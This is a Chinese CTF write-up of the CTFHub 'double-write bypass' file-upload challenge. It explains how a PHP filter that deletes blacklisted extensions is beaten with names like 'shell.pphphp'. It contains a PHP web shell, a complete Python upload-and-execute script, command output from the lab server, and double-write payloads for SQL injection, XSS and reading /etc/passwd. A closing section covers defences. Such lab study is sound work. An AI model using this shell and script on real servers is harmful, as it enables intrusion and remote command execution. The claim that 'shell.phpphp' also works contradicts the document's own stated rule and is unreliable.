---
layout: post
title: CTFHub - 文件上传 双写绕过 Writeup
platform: ctfhub
date: 2026-10-23 18:05:00 +0800
categories: CTF
---

CTFHub - 文件上传 双写绕过 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **文件上传** → 双写绕过）
- 题型：Web
- 考点：**`str_ireplace` 删除式过滤**、双写还原


```text
页面标题：CTFHub 文件上传——双写绕过

★ 源码泄露的后端逻辑（HTML 注释里）：

    $name = basename($_FILES['file']['name']);
    $blacklist = array("php", "php5", "php4", "php3", "phtml", "pht",
                       "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml",
                       "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx",
                       "cer", "swf", "htaccess", "ini");
    $name = str_ireplace($blacklist, "", $name);     // ★ 删除，不是拒绝

★ 关键区别：

    ❌ 拦截式：if (in_array($ext, $blacklist)) die("不允许");
       → 传 .php 直接报错，没法绕

    ✅ 删除式（本题）：$name = str_ireplace($blacklist, "", $name);
       → 把文件名里的 "php" 删掉，然后继续保存
       → 但删除是【一次性】的，只要写两遍就能剩一个！

★ 模拟验证：

    "shell.php"      --str_ireplace("php","")-->  "shell."      ❌ 无效名
    "shell.pphphp"   --str_ireplace("php","")-->  "shell.php"   ★ 还原了！
    "shell.phphpp"   --str_ireplace("php","")-->  "shell.hpp"   ❌ 不行
    "shell.ppHPhp"   --str_ireplace("php","")-->  "shell.php"   ★ 大小写也通

    ★ str_ireplace 是【不区分大小写】的，所以大小写混写也会被删
    ★ 但"双写"能还原

★ 实测上传：

    文件名：shell.pphphp
    内容：  <?php system($_GET['cmd']); ?>

    响应：
        上传文件相对路径
        upload/shell.php          ← ★ 服务器自己告诉我们名字被还原了

    ★ 同一目录下就不会有 shell.pphphp，只有 shell.php

★ 验证执行：

    GET /upload/shell.php?cmd=id
    → uid=33(www-data) gid=33(www-data) groups=33(www-data)      ✅ RCE

★ 找 flag：

    ?cmd=ls -la /var/www/html
    → flag_104876062.php

    ?cmd=cat /var/www/html/flag_104876062.php
    → <?php // ctfhub{32e49cf3849129b8ae1491b3}

flag         : ctfhub{32e49cf3849129b8ae1491b3}
```

二、题目分析

**① "删除式过滤"和"拦截式过滤"的本质区别**

```php
// 方式 A：拦截（正确做法）
if (in_array($ext, $blacklist)) {
    die("不允许上传");            // 直接拒绝
}
// → 攻击者必须换后缀或绕过后缀提取，难度高

// 方式 B：删除（本题的错误做法）
$name = str_ireplace($blacklist, "", $name);
move_uploaded_file($tmp, UPLOAD_DIR . $name);
// → 文件名里的危险词被删掉，然后【继续保存】
// → 攻击者可以"故意多写一个"，删掉后剩下的正好是危险后缀
```

**★ 关键认知**：

```
"删除"是一种"洗白"操作，而不是"拒绝"
洗白过的文件仍然会被保存 → 攻击者只要让洗白的结果是想要的名字就行
```

**② 双写的数学原理**

```
str_replace 会删除【所有不重叠的】匹配

"shell.pphphp" 里的 "php" 出现在哪？

    s  h  e  l  l  .  p  p  h  p  h  p
    0  1  2  3  4  5  6  7  8  9  10 11
                      └──┬──┘
                    从 7 开始匹配到 "php"（7,8,9）
                    
    删除后剩下：索引 6 的 "p" + 索引 10,11 的 "hp"
    → "p" + "hp" = "php"
    → 最终文件名："shell." + "php" = "shell.php"  ★
```

**换成别的写法试试**：

```
"shell.phphpp"
    s h e l l . p h p h p p
                  └─┬─┘
                匹配 (7,8,9) = "php"，删除
    剩下："shell." + "hp" + "p" = "shell.hpp"   ❌ 无效后缀

"shell.pphpph"
    匹配情况复杂，得多试几次
```

**★ 双写的正确姿势：把 `php` 拆成两半，中间再插一个 `php`**

```
想要的结果：  shell.php
写成：        shell.pphphp
                  └─┬─┘└┬┘
                 php+php 交错
```

**常用写法**：

```
shell.pphphp    → shell.php    ✅
shell.phphpph   → ?
shell.pphphhp   → ?
shell.pPhp      → shell.p      ❌（只有一个 php）
```

**★ 记一个就够：`shell.pphphp`**

**③ 为什么 `str_ireplace` 是大小写不敏感的**

```php
str_replace   → 区分大小写
str_ireplace  → 不区分大小写（i = case-insensitive）

所以：
    "shell.PHP"    → 被删（虽然是大写）
    "shell.PhP"    → 被删
    "shell.ppHPhp" → 变成 shell.php（删了中间那个 pHp）

★ 注意：本题用 str_ireplace，所以"改大小写"这招无效
  （如果是 str_replace 就能用 shell.PhP 绕过）
```

**④ 黑名单里还列了 `htaccess` 和 `ini`**

```php
"htaccess", "ini"
```

**为什么**：

```
防上一题（.htaccess）和 .user.ini 的套路
→ 把这两个也加进黑名单删除

★ 但同样可以用双写绕过：
    ".hhtaccesshtaccess"  →  ".htaccess"?
    或者  ".htaaccessccess" 等，需要试
```

**★ 不过本题最直接的还是 .php 双写。**

三、解题步骤

**第 1 步：看源码，识别过滤方式**

```
① 打开题目页面
② Ctrl+U 看源码
③ 看到：

    $name = str_ireplace($blacklist, "", $name);

★ 看到 str_replace / str_ireplace → 立刻想到"双写"
★ 看到 in_array + die → 那是"拦截"，双写没用
```

**第 2 步：构造双写文件名**

```
目标：最终变成 shell.php

文件名：shell.pphphp
        └──┬─┘└┬┘
        shell  php 被写了两遍，交错排列

验证逻辑：
    str_ireplace("php", "", "shell.pphphp")
    → 删除第一个匹配的 "php"（位置 7-9）
    → 剩下 "shell." + "p" + "hp" = "shell.php"  ✅
```

**第 3 步：上传**

**准备文件**，文件名 `shell.pphphp`，内容：

```php
<?php system($_GET['cmd']); ?>
```

**上传后看响应**：

```
上传文件相对路径
upload/shell.php          ← ★ 服务器告诉你名字被还原了
```

**★ 这题特别友好** —— 直接告诉你最终文件名。

**第 4 步：访问执行**

```
http://challenge-xxx:10800/upload/shell.php?cmd=id
→ uid=33(www-data)...
```

**第 5 步：找 flag**

```
?cmd=ls -la /var/www/html
→ flag_104876062.php

?cmd=cat /var/www/html/flag_104876062.php
→ <?php // ctfhub{32e49cf3849129b8ae1491b3}
```

---

**完整脚本**

```python
import uuid, urllib.request, urllib.parse

BASE = "http://challenge-xxx:10800"
OPEN = "<" + "?" + "php "
CLOSE = "?" + ">"


def upload(filename, content):
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex
    body = (("--%s\r\n" % boundary).encode()
            + b'Content-Disposition: form-data; name="submit"\r\n\r\nSubmit\r\n'
            + ("--%s\r\n" % boundary).encode()
            + ('Content-Disposition: form-data; name="file"; filename="%s"\r\n' % filename).encode()
            + b"Content-Type: image/jpeg\r\n\r\n"
            + content.encode() + b"\r\n"
            + ("--%s--\r\n" % boundary).encode())
    req = urllib.request.Request(BASE + "/", data=body, method="POST",
            headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary})
    return urllib.request.urlopen(req).read().decode()


# ★ 双写：shell.pphphp → shell.php
print(upload("shell.pphphp", OPEN + "system($_GET['cmd']); " + CLOSE))

u = BASE + "/upload/shell.php?cmd=" + urllib.parse.quote("ls -la /var/www/html")
print(urllib.request.urlopen(u).read().decode())
```

---

**手工操作（浏览器，最简单）**

```
① 本地准备文件：
   文件名：shell.pphphp
   内容：  <?php system($_GET['cmd']); ?>

   ★ Windows 上直接重命名就行（不涉及点开头的文件名）

② 上传 → 看响应里的"上传文件相对路径"
   → upload/shell.php

③ 访问 /upload/shell.php?cmd=id
```

**★ 这是本系列里第二容易手工做的题**（仅次于 00 截断）。

四、延伸知识

**① "删除式过滤"的通用破解思路**

| 过滤方式 | 绕过思路 | 例子 |
|---|---|---|
| **删除危险词**（`str_replace`）| **双写** | `php` → `pphphp` |
| 替换成空再检查（一次）| 双写 | 同上 |
| 小写化后比较 | 大小写（如果原文保留）| `PhP` |
| 正则 `/php/i` | 编码/变形 | `p /h/p`、`p%00hp` |
| 拼接着删（递归）| 嵌套 | `pphphphp`（多写几层）|

**递归删除的情况**：

```php
// 危险写法：一直删到没有为止
while (strpos($name, 'php') !== false) {
    $name = str_replace('php', '', $name);
}
// 这种情况下双写没用（会被删干净）

// 但可以用别的变体：
//   php5、phtml、phar、pht...
// 或者配合 .htaccess / 00 截断
```

**② 各种黑名单的双写构造**

```
目标后缀        双写写法
──────────────────────────────
.php        →  .pphphp
.php5       →  .pphphp5 ？需要试
.phtml      →  .phtml 写两遍交错
.jsp        →  .jspjsp ？
.asp        →  .aspasp ？
.htaccess   →  .htaccess 交错写
```

**通用方法**：

```
把目标字符串 S 写成：S 的前半 + S + S 的后半？
不对，正确的通用构造是：

    设 S = "php"
    想让它删掉一次后剩下 "php"
    → 需要原串里有两个 "php"，且它们不重叠，删掉一个还剩一个
    
    最简单：写 S + S = "phpphp"
    但 "phpphp" 里删掉第一个 "php" → 剩下 "php" ✅
    
    ★ 实际上 "phpphp" 就能用！
    ★ "pphphp" 也能用（位置 1 匹配）
    
    试：shell.phpphp
    → 位置 6: "phpphp" 里第一个 "php" 在 6-8
    → 剩下 "php" → shell.php ✅
```

**★ 所以 `shell.phpphp` 和 `shell.pphphp` 都能用。**

**③ 为什么"删除"比"拦截"危险**

```text
拦截式：
    检查 → 不通过 → 拒绝（文件不保存）
    → 攻击者必须找到一个"检查通过且能执行"的路径

删除式：
    检查 → 删除危险词 → 保存（文件保存了！只是名字变了）
    → 攻击者的目标变成"让删除后的结果正好是危险后缀"
    → 只要构造一个"删完变成 .php"的名字就行
```

**④ 其他类似的历史漏洞**

**（1）SQL 注入的"双写绕过"**

```sql
-- 过滤: 把 "union select" 替换成空
-- 输入: ununion selection select
-- 删掉一次后剩下: union select  ✅
```

**（2）XSS 的双写**

```html
<!-- 过滤: 把 "script" 替换成空 -->
<scrscriptipt>alert(1)</scrscriptipt>
<!-- 删掉后: <script>alert(1)</script> ✅ -->
```

**（3）命令注入的双写**

```bash
# 过滤: 把 "cat" 替换成空
ccat at /etc/passwd
# 删掉后: cat /etc/passwd ✅
```

**★ 双写是一个通用的绕过思路，不只用于文件上传。**

**⑤ 防护**

```text
① ★ 不要"删除"，要"拒绝"
    if (!in_array($ext, $allow)) die("不允许");
    （白名单 + 直接拒绝，不要"洗白"）

② ★ 上传后重命名
    $new = bin2hex(random_bytes(16)) . '.' . $ext;
    → 名字里根本不含用户输入

③ ★ 上传目录禁止执行

④ 不要把用户输入拼进路径

⑤ 校验要"一次到位"：
    提取后缀 → 白名单比对 → 通过才保存
    不要用"替换后再保存"这种"补救式"逻辑
```

五、总结

- **本题核心：`str_ireplace` 把危险词删掉后继续保存 → 双写还原。**
- 一个文件名：

```
shell.pphphp  →（删掉一个 php）→  shell.php
```

- **三个必记要点**：

```text
① 看到 str_replace / str_ireplace → 立刻想到"双写"
② "删除式过滤"= 洗白，不是拒绝 → 洗白结果可控就能绕过
③ str_ireplace 不区分大小写，所以大小写技巧无效，但双写仍然有效
```

- **实测 flag**：

```text
ctfhub{32e49cf3849129b8ae1491b3}
（在 /var/www/html/flag_104876062.php 里）
```


**手工复现要点**：

```text
· 看源码：如果是 str_replace → 双写
· 构造：shell.pphphp（或 shell.phpphp）
· 上传 → 响应会告诉你最终文件名
· 访问 /upload/shell.php?cmd=id
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────┐
│  拦截式过滤 → 需要绕过"检测"                             │
│  删除式过滤 → 只需要让"删完的结果"是想要的               │
│                                                        │
│  删除只做一次 → 写两遍，删一个剩一个                     │
│  这就是"双写"                                          │
└────────────────────────────────────────────────────────┘
```
